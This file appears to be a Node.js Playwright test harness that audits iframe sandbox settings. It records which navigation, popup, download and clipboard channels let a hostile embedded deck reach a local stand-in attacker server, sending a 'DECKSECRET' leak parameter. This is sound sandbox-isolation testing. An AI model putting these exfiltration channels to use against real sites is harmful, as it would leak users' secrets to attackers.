// Q3: what a hostile deck can reach, per sandbox token set. node q3.cjs [cross|same]
const L = require('./lib.cjs'); const fs = require('node:fs'); const H = require('./hostile/battery.js');
const mode = process.argv[2] || 'cross'; const APP = (mode === 'same' ? 'http://127.0.0.1' : 'http://localhost') + ':4620'; const PLAYER = 'http://127.0.0.1:4622'; const EVIL = 'http://127.0.0.2:4630';
const S0 = 'allow-scripts allow-same-origin'; const SETS = { S0, 'S1=S0+popups': S0 + ' allow-popups', 'S2=S0+popups+modals': S0 + ' allow-popups allow-modals', 'SX=everything': S0 + ' allow-popups allow-popups-to-escape-sandbox allow-modals allow-forms allow-downloads allow-pointer-lock allow-presentation allow-top-navigation-by-user-activation' };
(async () => {
  const app = await L.startStatic(4620, L.DIR + '/app'); const player = await L.startStatic(4622, L.DIR + '/player2'); const evil = await L.startEvil(4630);
  const browser = await L.realLaunch(); const out = { mode, version: browser.version(), caps: {}, navs: {} };
  const open = async (opts, fsrc) => { const context = await browser.newContext({ acceptDownloads: true }); await context.grantPermissions(['clipboard-read', 'clipboard-write'], { origin: APP }).catch(() => {}); const page = await context.newPage(); const seen = { dialogs: [], downloads: [], popups: [] };
    page.on('dialog', (d) => { seen.dialogs.push(d.type() + ': ' + d.message()); d.dismiss().catch(() => {}); }); page.on('download', (d) => seen.downloads.push(d.suggestedFilename())); context.on('page', (p) => seen.popups.push(p));
    await page.goto(`${APP}/app.html?player=${encodeURIComponent(PLAYER)}${fsrc ? '&fsrc=1' : ''}`); const o = await page.evaluate((x) => window.openV2(x), { files: H.files, ...opts }); const frame = page.frames().find((f) => f.url().includes('/vfs/')); return { context, page, frame, o, seen }; };
  try {
    const capRuns = mode === 'same' ? [['S0', '']] : [['S0', ''], ['S2=S0+popups+modals', 'fullscreen'], ['SX=everything', 'fullscreen; clipboard-write']];
    for (const [set, allow] of capRuns) {
      const { context, page, frame, seen } = await open({ sandbox: SETS[set], allow }, true); const r = {};
      for (const g of ['reach', 'fullscreen', 'pointerlock', 'clipboard', 'execcopy']) { await frame.locator('h1').click({ timeout: 3000 }).catch((e) => { r['click-' + g] = 'click failed'; }); Object.assign(r, await frame.evaluate(H.caps, g).catch((e) => ({ [g]: 'ERR ' + e.message.split('\n')[0] }))); }
      r['[app] dialogs shown'] = seen.dialogs.join(' | ') || 'none'; r['[app] messages received'] = JSON.stringify(await page.evaluate(() => window.__messages.filter((m) => m.data && m.data.forged)));
      await page.locator('#draft').click().catch(() => {}); r['[app] clipboard after deck'] = await page.evaluate(() => navigator.clipboard.readText()).catch((e) => 'unreadable: ' + e.message.split('\n')[0].slice(0, 60));
      r['[app] draft intact'] = await page.evaluate(() => document.getElementById('draft').value + ' / ' + localStorage.getItem('app-secret'));
      out.caps[`${set} | allow="${allow}"`] = r; await context.close();
    }
    if (mode !== 'same') {
      const all = Object.keys(H.navs); const plan = [];
      for (const ch of [...all, 'self-to-app']) plan.push([ch, 'S0', 0]); for (const ch of ['self-location', 'meta-refresh', 'form-get', 'self-to-app']) plan.push([ch, 'S0', 1]);
      for (const ch of ['window-open', 'a-target-blank']) plan.push([ch, 'S1=S0+popups', 1]); for (const ch of ['top-location', 'a-target-top', 'form-get', 'download', 'window-open']) plan.push([ch, 'SX=everything', 1]);
      for (const [ch, set, fsrc] of plan) {
        const run = `${ch}~${set}~fsrc${fsrc}`; const { context, page, frame, seen } = await open({ sandbox: SETS[set] }, fsrc); const U = ch === 'self-to-app' ? `${APP}/app.html?player=${encodeURIComponent(PLAYER)}&nested=1` : `${EVIL}/page?c=${ch}&run=${encodeURIComponent(run)}&leak=DECKSECRET`;
        const cspViol = []; page.on('console', (m) => { if (/Content Security Policy|sandbox|Refused|Blocked|Unsafe/i.test(m.text())) cspViol.push(m.text().slice(0, 140)); });
        await frame.locator('h1').click({ timeout: 3000 }).catch(() => {}); const ret = await frame.evaluate(H.navs[ch === 'self-to-app' ? 'self-location' : ch], U).catch((e) => 'evaluate ended: ' + e.message.split('\n')[0].slice(0, 60)); await L.sleep(1600);
        const hits = evil.log.filter((l) => l.run === run); const fr = page.frames().filter((f) => f !== page.mainFrame()).map((f) => f.url().slice(0, 60));
        const row = { returned: ret, attackerGot: hits.map((h) => `${h.method} dest=${h.dest} referer=${h.referer}`), topUrlChanged: !page.url().startsWith(APP), popups: seen.popups.length, popupInfo: null, downloads: seen.downloads, frameNow: fr, console: cspViol.slice(0, 2) };
        if (seen.popups[0]) row.popupInfo = await seen.popups[0].evaluate(() => ({ url: location.href.slice(0, 50), ls: (() => { try { localStorage.length; return 'storage ok (not opaque)'; } catch (e) { return 'storage ' + e.name + ' (sandboxed opaque)'; } })(), alert: (() => { const s = performance.now(); try { alert('x'); } catch (e) {} return Math.round(performance.now() - s) + ' ms'; })() })).catch((e) => 'eval failed: ' + e.message.split('\n')[0].slice(0, 60));
        if (ch === 'self-to-app') { const nf = page.frames().find((f) => f !== page.mainFrame() && f.url().startsWith(APP)); row.nestedApp = nf ? await nf.evaluate(() => ({ origin: self.origin, appSecretReadableByAppCodeInFrame: localStorage.getItem('app-secret') })).catch((e) => 'ERR ' + e.message.split('\n')[0]) : 'app page not loaded in frame'; }
        out.navs[run] = row; await context.close();
      }
    }
  } catch (e) { out.error = String(e.stack).slice(0, 500); }
  finally { await Promise.race([browser.close(), L.sleep(5000)]); for (const s of [app, player, evil]) await s.close(); }
  fs.writeFileSync(`${L.DIR}/out/q3-${mode}.json`, JSON.stringify(out, null, 1));
  for (const [k, v] of Object.entries(out.caps)) { console.log('=== caps ' + k); for (const [a, b] of Object.entries(v)) console.log('  ' + a.padEnd(30) + b); }
  for (const [k, v] of Object.entries(out.navs)) console.log('nav ' + k.padEnd(44) + JSON.stringify({ ret: v.returned, got: v.attackerGot.length ? v.attackerGot[0] : 0, top: v.topUrlChanged, pop: v.popups, popInfo: v.popupInfo || undefined, dl: v.downloads.length ? v.downloads : undefined, frame: v.frameNow.map((x) => x.replace(/vfs\/[0-9a-f]+/, 'vfs/T')), nested: v.nestedApp, con: v.console[0] }));
  if (out.error) console.log(out.error);
})();
